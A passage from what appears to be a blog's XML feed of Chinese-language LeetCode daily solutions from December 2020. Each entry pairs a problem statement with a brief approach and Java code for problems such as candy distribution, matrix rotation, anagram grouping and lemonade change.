    <content type="text"><![CDATA[题目：455. 分发饼干难度：简单 假设你是一位很棒的家长，想要给你的孩子们一些小饼干。但是，每个孩子最多只能给一块饼干。 对每个孩子 i，都有一个胃口值 g[i]，这是能让孩子们满足胃口的饼干的最小尺寸；并且每块饼干 j，都有一个尺寸 s[j] 。如果 s[j] &gt;= g[i]，我们可以将这个饼干 j 分配给孩子 i ，这个孩子会得到满足。你的目标是尽可能满足越多数量的孩子，并输出这个最大数值。 示例 1: 123456输入: g = [1,2,3], s = [1,1]输出: 1解释: 你有三个孩子和两块小饼干，3个孩子的胃口值分别是：1,2,3。虽然你有两块小饼干，由于他们的尺寸都是1，你只能让胃口值是1的孩子满足。所以你应该输出1。 示例 2: 123456输入: g = [1,2], s = [1,2,3]输出: 2解释: 你有两个孩子和三块小饼干，2个孩子的胃口值分别是1,2。你拥有的饼干数量和尺寸都足以让所有孩子满足。所以你应该输出2. 提示： 1 &lt;= g.length &lt;= 3 * 104 0 &lt;= s.length &lt;= 3 * 104 1 &lt;= g[i], s[j] &lt;= 231 - 1 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/assign-cookies著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 用尽量小的饼干去满足尽量小胃口的孩子 解题代码1234567891011121314151617181920212223242526272829class Solution &#123; public int findContentChildren(int[] g, int[] s) &#123; if (s.length &lt; 1) &#123; return 0; &#125; Arrays.sort(g); Arrays.sort(s); int ans = 0; int index = 0; for (int i = 0;i &lt; g.length;i++) &#123; while (index &lt; s.length &amp;&amp; s[index] &lt; g[i]) &#123; index++; &#125; if (index &lt; s.length &amp;&amp; s[index] &gt;= g[i]) &#123; ans++; index++; if (index &gt;= s.length) &#123; break; &#125; &#125; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>贪心算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/12/24]]></title>
    <url>%2Fposts%2F98e38ebc%2F</url>
    <content type="text"><![CDATA[题目：135. 分发糖果难度：困难 老师想给孩子们分发糖果，有 N 个孩子站成了一条直线，老师会根据每个孩子的表现，预先给他们评分。 你需要按照以下要求，帮助老师给这些孩子分发糖果： 每个孩子至少分配到 1 个糖果。 相邻的孩子中，评分高的孩子必须获得更多的糖果。 那么这样下来，老师至少需要准备多少颗糖果呢？ 示例 1: 123输入: [1,0,2]输出: 5解释: 你可以分别给这三个孩子分发 2、1、2 颗糖果。 示例 2: 1234输入: [1,2,2]输出: 4解释: 你可以分别给这三个孩子分发 1、2、1 颗糖果。 第三个孩子只得到 1 颗糖果，这已满足上述两个条件。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/candy著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 模拟好像就行了 解题代码12345678910111213141516171819202122232425262728class Solution &#123; public int candy(int[] ratings) &#123; int candys[] = new int[ratings.length]; for (int i = 0;i &lt; candys.length;i++) &#123; candys[i] = 1; &#125; int ans = 0; for (int i = 0;i + 1 &lt; ratings.length;i++) &#123; if (ratings[i + 1] &gt; ratings[i]) &#123; candys[i + 1] = candys[i] + 1; &#125; &#125; for (int i = ratings.length - 1;i - 1 &gt;= 0;i--) &#123; if (ratings[i] &lt; ratings[i - 1] &amp;&amp; candys[i - 1] &lt;= candys[i]) &#123; candys[i - 1] = candys[i] + 1; &#125; &#125; for (int i = 0;i &lt; candys.length;i++) &#123; ans += candys[i]; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>贪心算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/12/23]]></title>
    <url>%2Fposts%2F6871b1f%2F</url>
    <content type="text"><![CDATA[题目：387. 字符串中的第一个唯一字符难度：简单 给定一个字符串，找到它的第一个不重复的字符，并返回它的索引。如果不存在，则返回 -1。 示例： 12345s = &quot;leetcode&quot;返回 0s = &quot;loveleetcode&quot;返回 2 提示：你可以假定该字符串只包含小写字母。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/first-unique-character-in-a-string著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 两次遍历，第一次遍历，建立哈希表，第二次遍历找到该元素的下标 解题代码12345678910111213141516171819class Solution &#123; public int firstUniqChar(String s) &#123; int[] map = new int[26]; for (char c : s.toCharArray()) &#123; map[c - 'a']++; &#125; int ans = -1; for (int i = 0;i &lt; s.length();i++) &#123; if (map[s.charAt(i) - 'a'] == 1) &#123; ans = i; break; &#125; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>字符串</tag>
        <tag>哈希表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/12/22]]></title>
    <url>%2Fposts%2F71802b89%2F</url>
    <content type="text"><![CDATA[题目：103. 二叉树的锯齿形层序遍历难度：中等 给定一个二叉树，返回其节点值的锯齿形层序遍历。（即先从左往右，再从右往左进行下一层遍历，以此类推，层与层之间交替进行）。 例如：给定二叉树 [3,9,20,null,null,15,7], 12345 3 / \9 20 / \ 15 7 返回锯齿形层序遍历如下： 12345[ [3], [20,9], [15,7]] 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/binary-tree-zigzag-level-order-traversal著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 此题是在二叉树的层序遍历的基础上而来的，没啥可说的，bfs解决问题 解题代码123456789101112131415161718192021222324252627282930313233343536373839404142434445/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public List&lt;List&lt;Integer&gt;&gt; zigzagLevelOrder(TreeNode root) &#123; List&lt;List&lt;Integer&gt;&gt; ans = new ArrayList&lt;&gt;(); if (root == null) &#123; return ans; &#125; Queue&lt;TreeNode&gt; q = new LinkedList&lt;&gt;(); q.add(root); while (!q.isEmpty()) &#123; int size = q.size(); List&lt;Integer&gt; one = new ArrayList&lt;&gt;(); while (size-- &gt; 0) &#123; TreeNode p = q.poll(); one.add(p.val); if (p.left != null) &#123; q.add(p.left); &#125; if (p.right != null) &#123; q.add(p.right); &#125; &#125; if (ans.size() % 2 == 1) &#123; Collections.reverse(one); &#125; ans.add(one); &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>树</tag>
        <tag>二叉树</tag>
        <tag>广度优先搜索</tag>
        <tag>bfs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/12/21]]></title>
    <url>%2Fposts%2Fe8897a33%2F</url>
    <content type="text"><![CDATA[题目：难度：简单 数组的每个索引作为一个阶梯，第 i个阶梯对应着一个非负数的体力花费值 cost[i]（索引从0开始）。 每当你爬上一个阶梯你都要花费对应的体力花费值，然后你可以选择继续爬一个阶梯或者爬两个阶梯。 您需要找到达到楼层顶部的最低花费。在开始时，你可以选择从索引为 0 或 1 的元素作为初始阶梯。 示例 1: 123输入: cost = [10, 15, 20]输出: 15解释: 最低花费是从cost[1]开始，然后走两步即可到阶梯顶，一共花费15。 示例 2: 123输入: cost = [1, 100, 1, 1, 1, 100, 1, 1, 100, 1]输出: 6解释: 最低花费方式是从cost[0]开始，逐个经过那些1，跳过cost[3]，一共花费6。 注意： cost 的长度将会在 [2, 1000]。 每一个 cost[i] 将会是一个Integer类型，范围为 [0, 999]。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/min-cost-climbing-stairs著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 定义dp[i]为到达第i梯的最小花费，于是dp方程为dp[i] = Math.min(cost[i - 1] + dp[i - 1],cost[i - 2] + dp[i - 2]) 解题代码1234567891011121314151617181920class Solution &#123; public int minCostClimbingStairs(int[] cost) &#123; if (cost.length &lt; 2) &#123; return 0; &#125; if (cost.length == 2) &#123; return Math.min(cost[0],cost[1]); &#125; int[] dp = new int[cost.length + 1]; dp[0] = dp[1] = 0; for (int i = 2;i &lt; dp.length;i++) &#123; dp[i] = Math.min(cost[i - 1] + dp[i - 1],cost[i - 2] + dp[i - 2]); &#125; return dp[dp.length - 1]; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>动态规划</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/12/19]]></title>
    <url>%2Fposts%2Fcd7fa1c2%2F</url>
    <content type="text"><![CDATA[题目：48. 旋转图像难度：中等 给定一个 n × n 的二维矩阵表示一个图像。 将图像顺时针旋转 90 度。 说明： 你必须在原地旋转图像，这意味着你需要直接修改输入的二维矩阵。请不要使用另一个矩阵来旋转图像。 示例 1: 12345678910111213给定 matrix = [ [1,2,3], [4,5,6], [7,8,9]],原地旋转输入矩阵，使其变为:[ [7,4,1], [8,5,2], [9,6,3]] 示例 2: 123456789101112131415给定 matrix =[ [ 5, 1, 9,11], [ 2, 4, 8,10], [13, 3, 6, 7], [15,14,12,16]], 原地旋转输入矩阵，使其变为:[ [15,13, 2, 5], [14, 3, 4, 1], [12, 6, 8, 9], [16, 7,10,11]] 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/rotate-image著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 先转置矩阵，然后交换列 解题代码123456789101112131415161718class Solution &#123; public void rotate(int[][] matrix) &#123; int n = matrix.length; int[][] t = new int[n][n]; for (int i = 0;i &lt; n;i++) &#123; for (int j = 0;j &lt; n;j++) &#123; t[j][i] = matrix[i][j]; &#125; &#125; for (int i = 0;i &lt; n;i++) &#123; for (int j = 0;j &lt; n;j++) &#123; matrix[j][i] = t[j][n - 1 - i]; &#125; &#125; &#125;&#125; 开始没仔细看题，以为是螺旋填数，于是一番操作之后，提交，emmm 12345678910111213141516171819202122232425262728293031323334353637383940414243class Solution &#123; public void rotate(int[][] matrix) &#123; int n = matrix.length; int total = n * n; int nums[] = new int[total]; int index = 0; for (int i = 0;i &lt; n;i++) &#123; for (int j = 0;j &lt; n;j++) &#123; nums[index++] = matrix[i][j]; matrix[i][j] = 0; &#125; &#125; int y = n - 1; int x = 0; index = 0; while (index &lt; total) &#123; while (x &lt; n - 1 &amp;&amp; matrix[x][y] == 0) &#123; matrix[x][y] = nums[index++]; x++; &#125; while (y &gt; 0 &amp;&amp; matrix[x][y] == 0) &#123; matrix[x][y] = nums[index++]; y--; &#125; while (x &gt; 0 &amp;&amp; matrix[x][y] == 0) &#123; matrix[x][y] = nums[index++]; x--; &#125; while (y &lt; n - 1 &amp;&amp; matrix[x][y] == 0) &#123; matrix[x][y] = nums[index++]; y++; &#125; x++; y--; &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/12/18]]></title>
    <url>%2Fposts%2Fba789154%2F</url>
    <content type="text"><![CDATA[题目：389. 找不同难度：简单 给定两个字符串 s 和 t，它们只包含小写字母。 字符串 t 由字符串 s 随机重排，然后在随机位置添加一个字母。 请找出在 t 中被添加的字母。 示例 1： 123输入：s = &quot;abcd&quot;, t = &quot;abcde&quot;输出：&quot;e&quot;解释：&apos;e&apos; 是那个被添加的字母。 示例 2： 12输入：s = &quot;&quot;, t = &quot;y&quot;输出：&quot;y&quot; 示例 3： 12输入：s = &quot;a&quot;, t = &quot;aa&quot;输出：&quot;a&quot; 示例 4： 12输入：s = &quot;ae&quot;, t = &quot;aea&quot;输出：&quot;a&quot; 提示： 0 &lt;= s.length &lt;= 1000 t.length == s.length + 1 s 和 t 只包含小写字母 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/find-the-difference著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 两个思路：1. 建立映射表；2. 利用异或的性质 解题代码建立映射表 12345678910111213141516171819class Solution &#123; public char findTheDifference(String s, String t) &#123; int[] map = new int[26]; for (int i = 0;i &lt; s.length();i++) &#123; map[s.charAt(i) - 'a']++; map[t.charAt(i) - 'a']--; &#125; map[t.charAt(s.length()) - 'a']--; for (int i = 0;i &lt; map.length;i++) &#123; if (Math.abs(map[i]) == 1) &#123; return (char) (i + 'a'); &#125; &#125; return '\0'; &#125;&#125; 异或 12345678910111213class Solution &#123; public char findTheDifference(String s, String t) &#123; int ans = 0; for (int i = 0;i &lt; s.length();i++) &#123; ans ^= s.charAt(i); ans ^= t.charAt(i); &#125; ans ^= t.charAt(s.length()); return (char) ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>哈希表</tag>
        <tag>位运算</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/12/17]]></title>
    <url>%2Fposts%2F2ac78cc5%2F</url>
    <content type="text"><![CDATA[题目：714. 买卖股票的最佳时机含手续费难度：中等 给定一个整数数组 prices，其中第 i 个元素代表了第 i 天的股票价格 ；非负整数 fee 代表了交易股票的手续费用。 你可以无限次地完成交易，但是你每笔交易都需要付手续费。如果你已经购买了一个股票，在卖出它之前你就不能再继续购买股票了。 返回获得利润的最大值。 注意：这里的一笔交易指买入持有并卖出股票的整个过程，每笔交易你只需要为支付一次手续费。 示例 1: 12345678输入: prices = [1, 3, 2, 8, 4, 9], fee = 2输出: 8解释: 能够达到的最大利润: 在此处买入 prices[0] = 1在此处卖出 prices[3] = 8在此处买入 prices[4] = 4在此处卖出 prices[5] = 9总利润: ((8 - 1) - 2) + ((9 - 4) - 2) = 8. 注意: 0 &lt; prices.length &lt;= 50000. 0 &lt; prices[i] &lt; 50000. 0 &lt;= fee &lt; 50000. 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-with-transaction-fee著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 贪心策略：在第一个出现的价格最小值的那天买入，尽可能的在其后某天有赚的时候卖出，有赚的情况指卖出的收益要高于手续费，注意更新最小值 解题代码123456789101112131415161718192021class Solution &#123; public int maxProfit(int[] prices, int fee) &#123; int ans = 0; if (prices.length &lt; 2) &#123; return ans; &#125; int min = prices[0]; for (int i = 1;i &lt; prices.length;i++) &#123; if (prices[i] &lt; min) &#123; min = prices[i]; &#125; else if (prices[i] - min &gt; fee) &#123; ans += prices[i] - min - fee; min = prices[i] - fee; &#125; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>贪心算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/12/16]]></title>
    <url>%2Fposts%2F5dc0bc53%2F</url>
    <content type="text"><![CDATA[题目：290. 单词规律难度：简单 给定一种规律 pattern 和一个字符串 str ，判断 str 是否遵循相同的规律。 这里的 遵循 指完全匹配，例如， pattern 里的每个字母和字符串 str 中的每个非空单词之间存在着双向连接的对应规律。 示例1: 12输入: pattern = &quot;abba&quot;, str = &quot;dog cat cat dog&quot;输出: true 示例 2: 12输入:pattern = &quot;abba&quot;, str = &quot;dog cat cat fish&quot;输出: false 示例 3: 12输入: pattern = &quot;aaaa&quot;, str = &quot;dog cat cat dog&quot;输出: false 示例 4: 12输入: pattern = &quot;abba&quot;, str = &quot;dog dog dog dog&quot;输出: false 说明:你可以假设 pattern 只包含小写字母， str 包含了由单个空格分隔的小写字母。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/word-pattern著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 规律就是映射关系，所以很自然的就想到了哈希表，注意：这里的关系是双向一对一 解题代码1234567891011121314151617181920212223242526class Solution &#123; public boolean wordPattern(String pattern, String s) &#123; String[] split = s.split(" "); if (split.length != pattern.length()) &#123; return false; &#125; Map&lt;Character,String&gt; map = new HashMap&lt;&gt;(); for (int i = 0;i &lt; pattern.length();i++) &#123; char k = pattern.charAt(i); String v = split[i]; if (map.get(k) == null) &#123; if (map.values().contains(v)) &#123; return false; &#125; map.put(k,v); &#125; else &#123; if (!map.get(k).equals(v)) &#123; return false; &#125; &#125; &#125; return true; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>字符串</tag>
        <tag>哈希表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/12/15]]></title>
    <url>%2Fposts%2Fc4c9ede9%2F</url>
    <content type="text"><![CDATA[题目：738. 单调递增的数字难度：中等 给定一个非负整数 N，找出小于或等于 N 的最大的整数，同时这个整数需要满足其各个位数上的数字是单调递增。 （当且仅当每个相邻位数上的数字 x 和 y 满足 x &lt;= y 时，我们称这个整数是单调递增的。） 示例 1: 12输入: N = 10输出: 9 示例 2: 12输入: N = 1234输出: 1234 示例 3: 12输入: N = 332输出: 299 说明: N 是在 [0, 10^9] 范围内的一个整数。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/monotone-increasing-digits著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 贪心策略：从右往左找第一个不满足递增序列的位置，把这个位置前一个数字–，后面的补9即可， 解题代码12345678910111213141516171819class Solution &#123; public int monotoneIncreasingDigits(int N) &#123; char[] arr = String.valueOf(N).toCharArray(); int index = arr.length; for (int i = index - 1;i &gt; 0;i--) &#123; if (arr[i] &lt; arr[i - 1]) &#123; arr[i - 1]--; index = i; &#125; &#125; for (int i = index; i &lt; arr.length; i++) &#123; arr[i] = '9'; &#125; return Integer.valueOf(new String(arr)); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>贪心算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/12/14]]></title>
    <url>%2Fposts%2Fb3cedd7f%2F</url>
    <content type="text"><![CDATA[题目：49. 字母异位词分组难度：中等 给定一个字符串数组，将字母异位词组合在一起。字母异位词指字母相同，但排列不同的字符串。 示例: 1234567输入: [&quot;eat&quot;, &quot;tea&quot;, &quot;tan&quot;, &quot;ate&quot;, &quot;nat&quot;, &quot;bat&quot;]输出:[ [&quot;ate&quot;,&quot;eat&quot;,&quot;tea&quot;], [&quot;nat&quot;,&quot;tan&quot;], [&quot;bat&quot;]] 说明： 所有输入均为小写字母。 不考虑答案输出的顺序。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/group-anagrams著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路按照字符串中每个字符出现的次数作为键存入哈希表中即可 解题代码123456789101112131415161718class Solution &#123; public List&lt;List&lt;String&gt;&gt; groupAnagrams(String[] strs) &#123; Map&lt;String,List&lt;String&gt;&gt; map = new HashMap&lt;&gt;(); for (String s : strs) &#123; int key[] = new int[26]; for (char ch : s.toCharArray()) &#123; key[ch - 'a']++; &#125; String k = Arrays.toString(key); List&lt;String&gt; list = map.getOrDefault(k,new ArrayList&lt;&gt;()); list.add(s); map.put(k,list); &#125; return new ArrayList(map.values()); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>字符串</tag>
        <tag>哈希表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/12/13]]></title>
    <url>%2Fposts%2F2daa48dc%2F</url>
    <content type="text"><![CDATA[题目：217. 存在重复元素难度：简单 给定一个整数数组，判断是否存在重复元素。 如果任意一值在数组中出现至少两次，函数返回 true 。如果数组中每个元素都不相同，则返回 false 。 示例 1: 12输入: [1,2,3,1]输出: true 示例 2: 12输入: [1,2,3,4]输出: false 示例 3: 12输入: [1,1,1,3,3,4,3,2,4,2]输出: true 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/contains-duplicate著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 尝试将数组中的元素都存入哈希表中，在此过程中，如果发现已经存在重复的元素，直接返回true，当所有的元素都插入完成之后，代表没有重复的，返回false 解题代码1234567891011class Solution &#123; public boolean containsDuplicate(int[] nums) &#123; Set&lt;Integer&gt; set = new HashSet&lt;&gt;(); for (int e : nums) &#123; if (!set.add(e)) &#123; return true; &#125; &#125; return false; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>哈希表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/12/12]]></title>
    <url>%2Fposts%2F5aad784a%2F</url>
    <content type="text"><![CDATA[题目：376. 摆动序列难度：中等 如果连续数字之间的差严格地在正数和负数之间交替，则数字序列称为摆动序列。第一个差（如果存在的话）可能是正数或负数。少于两个元素的序列也是摆动序列。 例如， [1,7,4,9,2,5] 是一个摆动序列，因为差值 (6,-3,5,-7,3) 是正负交替出现的。相反, [1,4,7,2,5] 和 [1,7,4,5,5] 不是摆动序列，第一个序列是因为它的前两个差值都是正数，第二个序列是因为它的最后一个差值为零。 给定一个整数序列，返回作为摆动序列的最长子序列的长度。 通过从原始序列中删除一些（也可以不删除）元素来获得子序列，剩下的元素保持其原始顺序。 示例 1: 123输入: [1,7,4,9,2,5]输出: 6 解释: 整个序列均为摆动序列。 示例 2: 123输入: [1,17,5,10,13,15,10,5,16,8]输出: 7解释: 这个序列包含几个长度为 7 摆动序列，其中一个可为[1,17,10,13,10,16,8]。 示例 3: 12输入: [1,2,3,4,5,6,7,8,9]输出: 2 进阶:你能否用 O(n) 时间复杂度完成此题? 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/wiggle-subsequence著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 画个图就懂了，摆动序列波峰波谷 解题代码123456789101112131415161718192021class Solution &#123; public int wiggleMaxLength(int[] nums) &#123; int n = nums.length; if (n &lt; 2) &#123; return n; &#125; int up = 1; int down = 1; for (int i = 1;i &lt; nums.length;i++) &#123; if (nums[i - 1] &lt; nums[i]) &#123; up = down + 1; &#125; if (nums[i - 1] &gt; nums[i]) &#123; down = up + 1; &#125; &#125; return Math.max(up,down); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>脑经急转弯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/12/11]]></title>
    <url>%2Fposts%2Fc3a429f0%2F</url>
    <content type="text"><![CDATA[题目：649. Dota2 参议院难度：中等 Dota2 的世界里有两个阵营：Radiant(天辉)和 Dire(夜魇) Dota2 参议院由来自两派的参议员组成。现在参议院希望对一个 Dota2 游戏里的改变作出决定。他们以一个基于轮为过程的投票进行。在每一轮中，每一位参议员都可以行使两项权利中的一项： 禁止一名参议员的权利： 参议员可以让另一位参议员在这一轮和随后的几轮中丧失所有的权利。 宣布胜利： 如果参议员发现有权利投票的参议员都是同一个阵营的，他可以宣布胜利并决定在游戏中的有关变化。 给定一个字符串代表每个参议员的阵营。字母 “R” 和 “D” 分别代表了 Radiant（天辉）和 Dire（夜魇）。然后，如果有 n 个参议员，给定字符串的大小将是 n。 以轮为基础的过程从给定顺序的第一个参议员开始到最后一个参议员结束。这一过程将持续到投票结束。所有失去权利的参议员将在过程中被跳过。 假设每一位参议员都足够聪明，会为自己的政党做出最好的策略，你需要预测哪一方最终会宣布胜利并在 Dota2 游戏中决定改变。输出应该是 Radiant 或 Dire。 示例 1： 123输入：&quot;RD&quot;输出：&quot;Radiant&quot;解释：第一个参议员来自 Radiant 阵营并且他可以使用第一项权利让第二个参议员失去权力，因此第二个参议员将被跳过因为他没有任何权利。然后在第二轮的时候，第一个参议员可以宣布胜利，因为他是唯一一个有投票权的人 示例 2： 1234567输入：&quot;RDD&quot;输出：&quot;Dire&quot;解释：第一轮中,第一个来自 Radiant 阵营的参议员可以使用第一项权利禁止第二个参议员的权利第二个来自 Dire 阵营的参议员会被跳过因为他的权利被禁止第三个来自 Dire 阵营的参议员可以使用他的第一项权利禁止第一个参议员的权利因此在第二轮只剩下第三个参议员拥有投票的权利,于是他可以宣布胜利 提示： 给定字符串的长度在 [1, 10,000] 之间. 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/dota2-senate著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 参议员采用优先禁止离他最近的另一方的参议员的策略 解题代码123456789101112131415161718192021222324252627282930class Solution &#123; public String predictPartyVictory(String senate) &#123; Queue&lt;Integer&gt; r = new LinkedList&lt;&gt;(); Queue&lt;Integer&gt; d = new LinkedList&lt;&gt;(); for (int i = 0;i &lt; senate.length();i++) &#123; if (senate.charAt(i) == 'R') &#123; r.add(i); &#125; else &#123; d.add(i); &#125; &#125; while (!r.isEmpty() &amp;&amp; !d.isEmpty()) &#123; int rp = r.poll(); int dp = d.poll(); if (rp &lt; dp) &#123; r.add(rp + senate.length()); &#125; else &#123; d.add(dp + senate.length()); &#125; &#125; if (r.isEmpty()) &#123; return "Dire"; &#125; else &#123; return "Radiant"; &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>贪心算法</tag>
        <tag>模拟</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/12/10]]></title>
    <url>%2Fposts%2Fb4a31966%2F</url>
    <content type="text"><![CDATA[题目：860. 柠檬水找零难度：简单 在柠檬水摊上，每一杯柠檬水的售价为 5 美元。 顾客排队购买你的产品，（按账单 bills 支付的顺序）一次购买一杯。 每位顾客只买一杯柠檬水，然后向你付 5 美元、10 美元或 20 美元。你必须给每个顾客正确找零，也就是说净交易是每位顾客向你支付 5 美元。 注意，一开始你手头没有任何零钱。 如果你能给每位顾客正确找零，返回 true ，否则返回 false 。 示例 1： 1234567输入：[5,5,5,10,20]输出：true解释：前 3 位顾客那里，我们按顺序收取 3 张 5 美元的钞票。第 4 位顾客那里，我们收取一张 10 美元的钞票，并返还 5 美元。第 5 位顾客那里，我们找还一张 10 美元的钞票和一张 5 美元的钞票。由于所有客户都得到了正确的找零，所以我们输出 true。 示例 2： 12输入：[5,5,10]输出：true 示例 3： 12输入：[10,10]输出：false 示例 4： 1234567输入：[5,5,10,10,20]输出：false解释：前 2 位顾客那里，我们按顺序收取 2 张 5 美元的钞票。对于接下来的 2 位顾客，我们收取一张 10 美元的钞票，然后返还 5 美元。对于最后一位顾客，我们无法退回 15 美元，因为我们现在只有两张 10 美元的钞票。由于不是每位顾客都得到了正确的找零，所以答案是 false。 提示： 0 &lt;= bills.length &lt;= 10000 bills[i] 不是 5 就是 10 或是 20 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/lemonade-change著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 模拟找零过程，配合贪心的策略即可 解题代码12345678910111213141516171819202122232425262728293031323334353637class Solution &#123; public boolean lemonadeChange(int[] bills) &#123; int five = 0; int ten = 0; for (int e : bills) &#123; switch (e) &#123; case 5: five++; break; case 10: ten++; five--; if (five &lt; 0) &#123; return false; &#125; break; case 20: if (ten &gt; 0) &#123; ten--; five--; if (five &lt; 0) &#123; return false; &#125; &#125; else &#123; five -= 3; if (five &lt; 0) &#123; return false; &#125; &#125; break; &#125; &#125; return true; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>贪心算法</tag>
        <tag>模拟</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/12/9]]></title>
    <url>%2Fposts%2Fa916a9d8%2F</url>
